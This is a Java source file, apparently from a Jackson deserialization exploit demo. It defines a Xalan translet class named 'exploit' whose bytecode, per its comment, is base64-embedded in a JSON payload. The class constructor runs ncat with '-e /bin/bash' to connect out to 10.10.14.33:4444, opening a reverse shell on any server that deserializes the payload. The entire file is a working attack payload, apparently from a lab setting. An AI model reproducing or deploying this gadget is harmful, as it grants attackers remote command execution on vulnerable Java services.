package Jackson.JacksonDemo;

/** This class is used in car_xalan.json. It is the one base64 encoded in "transletBytecode" property **/
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import org.apache.xalan.xsltc.DOM;
import org.apache.xalan.xsltc.TransletException;
import org.apache.xml.dtm.DTMAxisIterator;
import org.apache.xml.serializer.SerializationHandler;

public class exploit extends org.apache.xalan.xsltc.runtime.AbstractTranslet {

	  public exploit() throws Exception {
		  StringBuilder result = new StringBuilder();
		    Process p = Runtime.getRuntime().exec(new String[] { "/usr/local/bin/ncat", "10.10.14.33", "4444" , "-e", "/bin/bash" });
		    p.waitFor();
		    URL url = new URL("http://localhost:8080/main.html");
		    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
		    String line = "";
		    StringBuffer output = new StringBuffer();
		    while ((line = reader.readLine()) != null) {
		        output.append(line + "\n");
		    }
	  }

	  public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
	  }

	  @Override
	  public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
	  }
	}